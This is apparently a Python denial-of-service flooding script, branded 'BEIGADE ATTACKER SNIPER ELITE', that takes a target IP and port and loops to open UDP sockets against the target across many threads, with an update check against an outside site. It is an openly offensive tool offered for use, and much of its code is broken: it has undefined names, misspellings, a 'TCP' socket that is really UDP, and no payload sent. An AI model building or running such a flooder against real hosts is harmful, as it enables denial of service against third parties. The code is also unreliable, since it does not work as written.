# -*- coding: utf-8 -*-         
import socket
import threading
import argparse
import os
import webbrowser
import requests
import sys
import time
os.system('clear')

# Initialize parser
parser = argparse.ArgumentParser()
 
# Adding optional argument
parser.add_argument("-T", "--Target", help = "Enter target to flood")
parser.add_argument("-p", "--Port", help = "Enter server port")
parser.add_argument("-F", "--Fakeip", help = "Fake but valid ip")
parser.add_argument("-M", "--Method", help = "Changes method")
parser.add_argument("--T", "--Threads", help = "Adds threads")

# Read arguments from command line
args = parser.parse_args()

target = (args.Target)
Port =   (args.Port)
Fakeip = (args.Fakeip)
attack_num = 0
threadcount = 25

#How we update
def update():
    time.sleep(3)
    webbrowser.open('https://KunFay99.tk/BAIT-DDoS/')

def checkver():
    content = open("ver.txt",r) 
    ver = content.read()

def comparever():
    latver = requests.get("https://KunFay99.tk/BAIT-DDoS/latver.txt")
    latver = latver.text
    if letver != ver:
        print("Updating now. We are sending you the updated url download")
        time.sleep(3)
        update()   

#UDP packet
def senditudp():
    sockudp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sockudp.connect((target, Port))
#TCP packet
def sendittcp():
    socktcp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    socktcp.connect((target, Port))

#Send packet
def lzzz():
    while True:
        sendittcp()
        print("tcp sent! :{}".format(args.Target))
        time.sleep(0)
        senditudp()
        print("udp sent! :{}".format(args.Target))
        time.sleep(0)

#Method
if args.Method =='udp-tcp':
    lzzz()

os.system("clear")
print("""\033[1;31m  \033[92m 
        |:::::::::::|                                           / ::
        ———— ::————/    ___   ____    ____   ___   ____         | ::
           | ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::         | ::
           | :: \ :: :: :: / :: | ::/ :: | ::| :: :: :: _____   | ::
           | ::  \ ::  ::  | :::::/ | :::::/ | :: \ ::: |_::::| | :::::::
            \__   \__/\__   \_____/  \_____/ |___  \___          \________
       ||———————————————————————————————————————————————————————————————————||
       ||___________ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ____________||

""")       
print(" ")
ip = input("\033[94m[*] \033[91mIP \033[91mTarget \033[97m>>> \033[93m ")
port = input("\033[94m[*] \033[91mPORT \033[97m>>> \033[93m ")
          
for i in range(1000):
    thread = threading.Thread(target=Fakeip)
    thread.start()

threads = []

for i in range(threadcount):
    th = threading.Thread(target=Attack)
    th.dameon = True
    threads.append(th)

for i in range(threadcount):
    threads[i].start()

for i in range(threadcount):
    threads[i].join()
